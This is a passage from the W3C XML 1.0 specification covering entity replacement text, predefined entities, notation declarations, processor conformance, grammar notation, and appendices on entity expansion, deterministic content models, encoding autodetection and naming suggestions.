in an entity declaration, it *MUST* be bypassed and left as is.

#### 4.4.8 Included as PE

Just as with external parsed entities, parameter entities need only be [included if validating](#include-if-valid). When a parameter-entity
reference is recognized in the DTD and included, its [replacement
text](#dt-repltext "Replacement Text")
*MUST* be enlarged by the attachment of one leading and one following
space (#x20) character; the intent is to constrain the replacement text of
parameter entities to contain an integral number of grammatical tokens in
the DTD. This
behavior *MUST NOT* apply to parameter entity references within entity values;
these are described in [**4.4.5 Included in Literal**](#inliteral).

#### 4.4.9 Error

It is an [error](#dt-error "Error") for a reference to
an unparsed entity to appear in the [EntityValue](#NT-EntityValue) in an
entity declaration.

### 4.5 Construction of Entity Replacement Text

In discussing the treatment of entities, it is useful to distinguish
two forms of the entity's value.
[Definition: For an
internal entity, the **literal
entity value** is the quoted string actually present in the entity declaration,
corresponding to the non-terminal [EntityValue](#NT-EntityValue).]
[Definition: For an external entity, the **literal
entity value** is the exact text contained in the entity.]
[Definition: For an
internal entity, the **replacement text**
is the content of the entity, after replacement of character references and
parameter-entity references.]
[Definition: For
an external entity, the **replacement text** is the content of the entity,
after stripping the text declaration (leaving any surrounding whitespace) if there
is one but without any replacement of character references or parameter-entity
references.]

The literal entity value as given in an internal entity declaration ([EntityValue](#NT-EntityValue)) may contain character, parameter-entity,
and general-entity references. Such references *MUST* be contained entirely
within the literal entity value. The actual replacement text that is [included](#dt-include "Include") (or [included in literal](#inliteral)) as described above
*MUST* contain the *replacement
text* of any parameter entities referred to, and *MUST* contain the character
referred to, in place of any character references in the literal entity value;
however, general-entity references *MUST* be left as-is, unexpanded. For example,
given the following declarations:

```
<!ENTITY % pub    "&#xc9;ditions Gallimard" >
<!ENTITY   rights "All rights reserved" >
<!ENTITY   book   "La Peste: Albert Camus,
&#xA9; 1947 %pub;. &rights;" >
```

then the replacement text for the entity "
`book`
"
is:

```
La Peste: Albert Camus,
© 1947 Éditions Gallimard. &rights;
```

The general-entity reference "
`&rights;`
" would
be expanded should the reference "
`&book;`
" appear
in the document's content or an attribute value.

These simple rules may have complex interactions; for a detailed discussion
of a difficult example, see [**D Expansion of Entity and Character References**](#sec-entexpand).

### 4.6 Predefined Entities

[Definition: Entity and character references may
both be used to **escape** the left angle bracket, ampersand, and
other delimiters. A set of general entities (`amp`,
`lt`,
`gt`,
`apos`,
`quot`) is specified for
this purpose. Numeric character references may also be used; they are expanded
immediately when recognized and *MUST* be treated as character data, so the
numeric character references "
`&#60;`
" and "
`&#38;`
" may be used to escape `<` and `&` when they occur
in character data.]

All XML processors *MUST* recognize these entities whether they are declared
or not. [For interoperability](#dt-interop "For interoperability"), valid XML
documents *SHOULD* declare these entities, like any others, before using them. If
the entities `lt` or `amp` are declared, they *MUST* be
declared as internal entities whose replacement text is a character reference
to the respective
character (less-than sign or ampersand) being escaped; the double
escaping is *REQUIRED* for these entities so that references to them produce
a well-formed result. If the entities `gt`, `apos`,
or `quot` are declared, they *MUST* be declared as internal entities
whose replacement text is the single character being escaped (or a character
reference to that character; the double escaping here is *OPTIONAL* but harmless).
For example:

```
<!ENTITY lt     "&#38;#60;">
<!ENTITY gt     "&#62;">
<!ENTITY amp    "&#38;#38;">
<!ENTITY apos   "&#39;">
<!ENTITY quot   "&#34;">
```
### 4.7 Notation Declarations

[Definition:
**Notations** identify
by name the format of [unparsed entities](#dt-unparsed "Unparsed Entity"),
the format of elements which bear a notation attribute, or the application
to which a [processing instruction](#dt-pi "Processing instruction") is addressed.]

[Definition:
**Notation declarations**
provide a name for the notation, for use in entity and attribute-list declarations
and in attribute specifications, and an external identifier for the notation
which may allow an XML processor or its client application to locate a helper
application capable of processing data in the given notation.]

##### Notation Declarations

| [82] | `NotationDecl` | ::= | `'<!NOTATION' [S](#NT-S) [Name](#NT-Name) [S](#NT-S) ([ExternalID](#NT-ExternalID) | [PublicID](#NT-PublicID)) [S](#NT-S)? '>'` | [[VC: Unique Notation Name]](#UniqueNotationName) |
| --- | --- | --- | --- | --- |
| [83] | `PublicID` | ::= | `'PUBLIC' [S](#NT-S) [PubidLiteral](#NT-PubidLiteral)` |
| --- | --- | --- | --- |

**Validity constraint: Unique Notation Name**

A given [Name](#NT-Name)
*MUST NOT* be declared in more than one notation declaration.

XML processors *MUST* provide applications with the name and external identifier(s)
of any notation declared and referred to in an attribute value, attribute
definition, or entity declaration. They *MAY* additionally resolve the external
identifier into the [system identifier](#dt-sysid "System Identifier"), file
name, or other information needed to allow the application to call a processor
for data in the notation described. (It is not an error, however, for XML
documents to declare and refer to notations for which notation-specific applications
are not available on the system where the XML processor or application is
running.)

### 4.8 Document Entity

[Definition: The **document entity**
serves as the root of the entity tree and a starting-point for an [XML processor](#dt-xml-proc "XML Processor").] This specification does
not specify how the document entity is to be located by an XML processor;
unlike other entities, the document entity has no name and might well appear
on a processor input stream without any identification at all.

## 5 Conformance

### 5.1 Validating and Non-Validating Processors

Conforming [XML processors](#dt-xml-proc "XML Processor") fall into
two classes: validating and non-validating.

Validating and non-validating processors alike *MUST* report violations of
this specification's well-formedness constraints in the content of the [document entity](#dt-docent "Document Entity") and any other [parsed
entities](#dt-parsedent "Text Entity") that they read.

[Definition:
**Validating
processors**
*MUST*,
at user option, report violations of the constraints expressed by
the declarations in the [DTD](#dt-doctype "Document Type Declaration"), and failures
to fulfill the validity constraints given in this specification.]
To accomplish this, validating XML processors *MUST* read and process the entire
DTD and all external parsed entities referenced in the document.

Non-validating processors are *REQUIRED* to check only the [document
entity](#dt-docent "Document Entity"), including the entire internal DTD subset, for well-formedness. [Definition: While they are not required
to check the document for validity, they are *REQUIRED* to **process**
all the declarations they read in the internal DTD subset and in any parameter
entity that they read, up to the first reference to a parameter entity that
they do *not* read; that is to say, they *MUST* use the information
in those declarations to [normalize](#AVNormalize)
attribute values, [include](#included) the replacement
text of internal entities, and supply [default
attribute values](#sec-attr-defaults).] Except when `standalone="yes"`, they
*MUST NOT*
[process](#dt-use-mdecl "Process Declarations")
[entity
declarations](#dt-entdecl "entity declaration") or [attribute-list declarations](#dt-attdecl "Attribute-List Declaration")
encountered after a reference to a parameter entity that is not read, since
the entity may have contained overriding declarations; when `standalone="yes"`, processors *MUST*
process these declarations.

Note that when processing invalid documents with a non-validating
processor the application may not be presented with consistent
information. For example, several requirements for uniqueness
within the document may not be met, including more than one element
with the same id, duplicate declarations of elements or notations
with the same name, etc. In these cases the behavior of the parser
with respect to reporting such information to the application is
undefined.

### 5.2 Using XML Processors

The behavior of a validating XML processor is highly predictable; it must
read every piece of a document and report all well-formedness and validity
violations. Less is required of a non-validating processor; it need not read
any part of the document other than the document entity. This has two effects
that may be important to users of XML processors:

* Certain well-formedness errors, specifically those that require reading
  external entities, may fail to be detected by a non-validating processor. Examples
  include the constraints entitled [Entity Declared](#wf-entdeclared), [Parsed Entity](#textent), and [No
  Recursion](#norecursion), as well as some of the cases described as [forbidden](#forbidden) in [**4.4 XML Processor Treatment of Entities and References**](#entproc).
* The information passed from the processor to the application may
  vary, depending on whether the processor reads parameter and external entities.
  For example, a non-validating processor may fail to [normalize](#AVNormalize)
  attribute values, [include](#included) the replacement
  text of internal entities, or supply [default
  attribute values](#sec-attr-defaults), where doing so depends on having read declarations
  in external or parameter entities, or in the internal subset after an unread
  parameter entity reference.

For maximum reliability in interoperating between different XML processors,
applications which use non-validating processors *SHOULD NOT* rely on any behaviors
not required of such processors. Applications which require DTD facilities not related to validation (such
as the declaration of default attributes and internal entities that are or may be specified in
external entities) *SHOULD* use validating XML processors.

## 6 Notation

The formal grammar of XML is given in this specification using a simple
Extended Backus-Naur Form (EBNF) notation. Each rule in the grammar defines
one symbol, in the form

```
symbol ::= expression
```

Symbols are written with an initial capital letter if they are the
start symbol of a regular language, otherwise with an initial lowercase letter.
Literal strings are quoted.

Within the expression on the right-hand side of a rule, the following expressions
are used to match strings of one or more characters:

`#xN`

where `N` is a hexadecimal integer, the expression matches the character
whose number
(code point) in ISO/IEC 10646 is `N`. The number of leading zeros in the `#xN`
form is insignificant.

`[a-zA-Z]`, `[#xN-#xN]`

matches any [Char](#NT-Char) with a value in the range(s) indicated (inclusive).

`[abc]`, `[#xN#xN#xN]`

matches any [Char](#NT-Char) with a value among the characters
enumerated. Enumerations and ranges can be mixed in one set of brackets.

`[^a-z]`, `[^#xN-#xN]`

matches any [Char](#NT-Char) with a value *outside* the range
indicated.

`[^abc]`, `[^#xN#xN#xN]`

matches any [Char](#NT-Char) with a value not among the characters given. Enumerations
and ranges of forbidden values can be mixed in one set of brackets.

`"string"`

matches a literal string [matching](#dt-match "match") that
given inside the double quotes.

`'string'`

matches a literal string [matching](#dt-match "match") that
given inside the single quotes.

These symbols may be combined to match more complex patterns as follows,
where `A` and `B` represent simple expressions:

(`expression`)

`expression` is treated as a unit and may be combined as described
in this list.

`A?`

matches `A` or nothing; optional `A`.

`A B`

matches `A` followed by `B`. This
operator has higher precedence than alternation; thus `A B | C D`
is identical to `(A B) | (C D)`.

`A | B`

matches `A` or `B`.

`A - B`

matches any string that matches `A` but does not match `B`.

`A+`

matches one or more occurrences of `A`. Concatenation
has higher precedence than alternation; thus `A+ | B+` is identical
to `(A+) | (B+)`.

`A*`

matches zero or more occurrences of `A`. Concatenation
has higher precedence than alternation; thus `A* | B*` is identical
to `(A*) | (B*)`.

Other notations used in the productions are:

`/* ... */`

comment.

`[ wfc: ... ]`

well-formedness constraint; this identifies by name a constraint on [well-formed](#dt-wellformed "Well-Formed") documents associated with a production.

`[ vc: ... ]`

validity constraint; this identifies by name a constraint on [valid](#dt-valid "Validity")
documents associated with a production.

## B Character Classes

Because of changes to productions
[[4]](#NT-NameStartChar) and [[5]](#NT-Name), the productions in
this Appendix are now orphaned and not used anymore in determining
name characters. This Appendix may be removed in a future edition of
this specification; other specifications that wish to refer to the productions herein should
do so by means of a reference to the relevant production(s) in the
[Fourth Edition](https://www.w3.org/TR/2006/REC-xml-20060816/) of this specification.

Following the characteristics defined in the Unicode standard, characters
are classed as base characters (among others, these contain the alphabetic
characters of the Latin alphabet), ideographic characters, and combining characters (among
others, this class contains most diacritics). Digits and extenders are also
distinguished.

##### Characters

The character classes defined here can be derived from the Unicode 2.0
character database as follows:

* Name start characters must have one of the categories Ll, Lu, Lo,
  Lt, Nl.
* Name characters other than Name-start characters must have one of
  the categories Mc, Me, Mn, Lm, or Nd.
* Characters in the compatibility area (i.e. with character code greater
  than #xF900 and less than #xFFFE) are not allowed in XML names.
* Characters which have a font or compatibility decomposition (i.e.
  those with a "compatibility formatting tag" in field 5 of the
  database -- marked by field 5 beginning with a "<") are not
  allowed.
* The following characters are treated as name-start characters rather
  than name characters, because the property file classifies them as Alphabetic:
  [#x02BB-#x02C1], #x0559, #x06E5, #x06E6.
* Characters #x20DD-#x20E0 are excluded (in accordance with Unicode 2.0,
  section 5.14).
* Character #x00B7 is classified as an extender, because the property
  list so identifies it.
* Character #x0387 is added as a name character, because #x00B7 is
  its canonical equivalent.
* Characters ':' and '\_' are allowed as name-start characters.
* Characters '-' and '.' are allowed as name characters.
## C XML and SGML (Non-Normative)

XML
is designed to be a subset of SGML, in that every XML document should also
be a conforming SGML document. For a detailed comparison of the additional
restrictions that XML places on documents beyond those of SGML, see [[Clark]](#Clark).

## D Expansion of Entity and Character References (Non-Normative)

This appendix contains some examples illustrating the sequence of entity-
and character-reference recognition and expansion, as specified in [**4.4 XML Processor Treatment of Entities and References**](#entproc).

If the DTD contains the declaration

```
<!ENTITY example "<p>An ampersand (&#38;#38;) may be escaped
numerically (&#38;#38;#38;) or with a general entity
(&amp;amp;).</p>" >
```

then the XML processor will recognize the character references when it
parses the entity declaration, and resolve them before storing the following
string as the value of the entity "
`example`
":

```
<p>An ampersand (&#38;) may be escaped
numerically (&#38;#38;) or with a general entity
(&amp;amp;).</p>
```

A reference in the document to "
`&example;`
"
will cause the text to be reparsed, at which time the start- and end-tags
of the `p` element will be recognized and the three references will
be recognized and expanded, resulting in a `p` element with the following
content (all data, no delimiters or markup):

```
An ampersand (&) may be escaped
numerically (&#38;) or with a general entity
(&amp;).
```

A more complex example will illustrate the rules and their effects fully.
In the following example, the line numbers are solely for reference.

```
1 <?xml version='1.0'?>
2 <!DOCTYPE test [
3 <!ELEMENT test (#PCDATA) >
4 <!ENTITY % xx '&#37;zz;'>
5 <!ENTITY % zz '&#60;!ENTITY tricky "error-prone" >' >
6 %xx;
7 ]>
8 <test>This sample shows a &tricky; method.</test>
```

This produces the following:

* in line 4, the reference to character 37 is expanded immediately,
  and the parameter entity "
  `xx`
  " is stored in the symbol
  table with the value "
  `%zz;`
  ". Since the replacement
  text is not rescanned, the reference to parameter entity "
  `zz`
  "
  is not recognized. (And it would be an error if it were, since "
  `zz`
  "
  is not yet declared.)
* in line 5, the character reference "
  `&#60;`
  "
  is expanded immediately and the parameter entity "
  `zz`
  "
  is stored with the replacement text "
  `<!ENTITY tricky "error-prone"
  >`
  ", which is a well-formed entity declaration.
* in line 6, the reference to "
  `xx`
  " is recognized,
  and the replacement text of "
  `xx`
  " (namely "
  `%zz;`
  ")
  is parsed. The reference to "
  `zz`
  " is recognized in
  its turn, and its replacement text ("
  `<!ENTITY tricky "error-prone"
  >`
  ") is parsed. The general entity "
  `tricky`
  "
  has now been declared, with the replacement text "
  `error-prone`
  ".
* in line 8, the reference to the general entity "
  `tricky`
  "
  is recognized, and it is expanded, so the full content of the `test`
  element is the self-describing (and ungrammatical) string *This sample
  shows a error-prone method.*

In the following example

```
<!DOCTYPE foo [
<!ENTITY x "&lt;">
]>
<foo attr="&x;"/>
```

the replacement text of x is the four characters "&lt;" because
references to general entities in entity values are [bypassed](#bypass).
The replacement text of lt is a character reference to
the less-than character, for example the five characters "&#60;"
(see [**4.6 Predefined Entities**](#sec-predefined-ent)). Since neither of these contains a less-than character
the result is well-formed.

If the definition of x had been

```
<!ENTITY x "&#60;">
```

then the document would not have been well-formed, because the
replacement text of x would be the single character "<" which
is not permitted in attribute values (see [WFC: No < in Attribute Values](#CleanAttrVals)).

## E Deterministic Content Models (Non-Normative)

As
noted in [**3.2.1 Element Content**](#sec-element-content), it is required that content
models in element type declarations be deterministic. This requirement is [for compatibility](#dt-compat "For Compatibility") with SGML (which calls deterministic
content models "unambiguous"); XML processors built
using SGML systems may flag non-deterministic content models as errors.

For example, the content model `((b, c) | (b, d))` is non-deterministic,
because given an initial `b` the XML processor
cannot know which `b` in the model is being matched without looking
ahead to see which element follows the `b`. In this case, the two references
to `b` can be collapsed into a single reference, making the model read `(b,
(c | d))`. An initial `b` now clearly matches only a single name
in the content model. The processor doesn't need to look ahead to see what follows; either `c` or `d`
would be accepted.

More formally: a finite state automaton may be constructed from the content
model using the standard algorithms, e.g. algorithm 3.5 in section 3.9 of
Aho, Sethi, and Ullman [[Aho/Ullman]](#Aho). In many such algorithms, a follow
set is constructed for each position in the regular expression (i.e., each
leaf node in the syntax tree for the regular expression); if any position
has a follow set in which more than one following position is labeled with
the same element type name, then the content model is in error and may be
reported as an error.

Algorithms exist which allow many but not all non-deterministic content
models to be reduced automatically to equivalent deterministic models; see
Brüggemann-Klein 1991 [[Brüggemann-Klein]](#ABK).

## F Autodetection of Character Encodings (Non-Normative)

The XML encoding declaration functions as an internal label on each entity,
indicating which character encoding is in use. Before an XML processor can
read the internal label, however, it apparently has to know what character
encoding is in use—which is what the internal label is trying to indicate.
In the general case, this is a hopeless situation. It is not entirely hopeless
in XML, however, because XML limits the general case in two ways: each implementation
is assumed to support only a finite set of character encodings, and the XML
encoding declaration is restricted in position and content in order to make
it feasible to autodetect the character encoding in use in each entity in
normal cases. Also, in many cases other sources of information are available
in addition to the XML data stream itself. Two cases may be distinguished,
depending on whether the XML entity is presented to the processor without,
or with, any accompanying (external) information. We will consider
these cases in turn.

### F.1 Detection Without External Encoding Information

Because each XML entity not accompanied by external
encoding information and not in UTF-8 or UTF-16 encoding must
begin with an XML encoding declaration, in which the first characters must
be '`<?xml`', any conforming processor can detect, after two
to four octets of input, which of the following cases apply. In reading this
list, it may help to know that in UCS-4, '<' is "
`#x0000003C`
"
and '?' is "
`#x0000003F`
", and the Byte Order Mark
required of UTF-16 data streams is "
`#xFEFF`
". The notation
## is used to denote any byte value except that two consecutive
##s cannot be both 00.

With a Byte Order Mark:

| `00 00 FE FF` | UCS-4, big-endian machine (1234 order) |
| --- | --- |
| `FF FE 00 00` | UCS-4, little-endian machine (4321 order) |
| `00 00 FF FE` | UCS-4, unusual octet order (2143) |
| `FE FF 00 00` | UCS-4, unusual octet order (3412) |
| `FE FF ## ##` | UTF-16, big-endian |
| `FF FE ## ##` | UTF-16, little-endian |
| `EF BB BF` | UTF-8 |

Without a Byte Order Mark:

| `00 00 00 3C` | UCS-4 or other encoding with a 32-bit code unit and ASCII characters encoded as ASCII values, in respectively big-endian (1234), little-endian (4321) and two unusual byte orders (2143 and 3412). The encoding declaration must be read to determine which of UCS-4 or other supported 32-bit encodings applies. |
| --- | --- |
| `3C 00 00 00` |
| `00 00 3C 00` |
| `00 3C 00 00` |
| `00 3C 00 3F` | UTF-16BE or big-endian ISO-10646-UCS-2 or other encoding with a 16-bit code unit in big-endian order and ASCII characters encoded as ASCII values (the encoding declaration must be read to determine which) |
| `3C 00 3F 00` | UTF-16LE or little-endian ISO-10646-UCS-2 or other encoding with a 16-bit code unit in little-endian order and ASCII characters encoded as ASCII values (the encoding declaration must be read to determine which) |
| `3C 3F 78 6D` | UTF-8, ISO 646, ASCII, some part of ISO 8859, Shift-JIS, EUC, or any other 7-bit, 8-bit, or mixed-width encoding which ensures that the characters of ASCII have their normal positions, width, and values; the actual encoding declaration must be read to detect which of these applies, but since all of these encodings use the same bit patterns for the relevant ASCII characters, the encoding declaration itself may be read reliably |
| `4C 6F A7 94` | EBCDIC (in some flavor; the full encoding declaration must be read to tell which code page is in use) |
| Other | UTF-8 without an encoding declaration, or else the data stream is mislabeled (lacking a required encoding declaration), corrupt, fragmentary, or enclosed in a wrapper of some kind |

**Note:**

In cases above which do not require reading the encoding declaration to
determine the encoding, section 4.3.3 still requires that the encoding declaration,
if present, be read and that the encoding name be checked to match the actual
encoding of the entity. Also, it is possible that new character encodings
will be invented that will make it necessary to use the encoding declaration
to determine the encoding, in cases where this is not required at present.

This level of autodetection is enough to read the XML encoding declaration
and parse the character-encoding identifier, which is still necessary to distinguish
the individual members of each family of encodings (e.g. to tell UTF-8 from
8859, and the parts of 8859 from each other, or to distinguish the specific
EBCDIC code page in use, and so on).

Because the contents of the encoding declaration are restricted to characters
from the ASCII repertoire (however encoded),
a processor can reliably read the entire encoding declaration as soon as it
has detected which family of encodings is in use. Since in practice, all widely
used character encodings fall into one of the categories above, the XML encoding
declaration allows reasonably reliable in-band labeling of character encodings,
even when external sources of information at the operating-system or transport-protocol
level are unreliable. Character encodings such as UTF-7
that make overloaded usage of ASCII-valued bytes may fail to be reliably detected.

Once the processor has detected the character encoding in use, it can act
appropriately, whether by invoking a separate input routine for each case,
or by calling the proper conversion function on each character of input.

Like any self-labeling system, the XML encoding declaration will not work
if any software changes the entity's character set or encoding without updating
the encoding declaration. Implementors of character-encoding routines should
be careful to ensure the accuracy of the internal and external information
used to label the entity.

### F.2 Priorities in the Presence of External Encoding Information

The second possible case occurs when the XML entity is accompanied by encoding
information, as in some file systems and some network protocols. When multiple
sources of information are available, their relative priority and the preferred
method of handling conflict should be specified as part of the higher-level
protocol used to deliver XML. In particular, please refer
to [[IETF RFC 3023]](#rfc2376) or its successor, which defines the `text/xml`
and `application/xml` MIME types and provides some useful guidance.
In the interests of interoperability, however, the following rule is recommended.

* If an XML entity is in a file, the Byte-Order Mark and encoding declaration are used
  (if present) to determine the character encoding.

## I Production Notes (Non-Normative)

This edition was encoded in a
slightly modified version of the
[XMLspec DTD, v2.10](https://www.w3.org/2002/xmlspec/dtd/2.10/xmlspec.dtd).
The XHTML versions were produced with a combination of the
[xmlspec.xsl](https://www.w3.org/2002/xmlspec/xhtml/1.13/xmlspec.xsl),
[diffspec.xsl](https://www.w3.org/2002/xmlspec/xhtml/1.13/diffspec.xsl),
and <REC-xml.xsl>
XSLT stylesheets.

## J Suggestions for XML Names (Non-Normative)

The following suggestions define what is believed to be best
practice in the construction of XML names used as element names,
attribute names, processing instruction targets, entity names,
notation names, and the values of attributes of type ID, and are
intended as guidance for document authors and schema designers.
All references to Unicode are understood with respect to
a particular version of the Unicode Standard greater than or equal
to 5.0; which version should be used is left to the discretion of
the document author or schema designer.

The first two suggestions are directly derived from the rules
given for identifiers in Standard Annex #31 (UAX #31) of the Unicode Standard, version 5.0 [[Unicode]](#Unicode), and
exclude all control characters, enclosing nonspacing marks,
non-decimal numbers, private-use characters, punctuation characters
(with the noted exceptions), symbol characters, unassigned
codepoints, and white space characters. The other suggestions
are mostly derived from Appendix B in previous editions of this specification.

1. The first character of any name should have a Unicode property
   of ID\_Start, or else be '\_' #x5F.
2. Characters other than the first should have a Unicode property
   of ID\_Continue, or be one of the characters listed in the table
   entitled "Characters for Natural Language Identifiers" in UAX
   #31, with the exception of "'" #x27 and "’" #x2019.
3. Characters in names should be expressed using
   Normalization Form C as defined in [[UnicodeNormal]](#unipart15).
4. Ideographic characters which have a canonical decomposition
   (including those in the ranges [#xF900-#xFAFF] and
   [#x2F800-#x2FFFD], with 12 exceptions) should not be used in names.
5. Characters which have a compatibility decomposition (those with
   a "compatibility formatting tag" in field 5 of the Unicode
   Character Database -- marked by field 5 beginning with a "<")
   should not be used in names. This suggestion does not apply
   to characters which
   despite their compatibility decompositions are in regular use in
   their scripts, for
   example #x0E33 THAI CHARACTER SARA AM or #x0EB3 LAO CHARACTER AM.
6. Combining characters meant for use with symbols only (including
   those in the ranges [#x20D0-#x20EF] and [#x1D165-#x1D1AD]) should
   not be used in names.
7. The interlinear annotation characters ([#xFFF9-#xFFFB]) should
   not be used in names.
8. Variation selector characters should not be used in names.
9. Names which are nonsensical, unpronounceable, hard to read, or
   easily confusable with other names should not be employed.
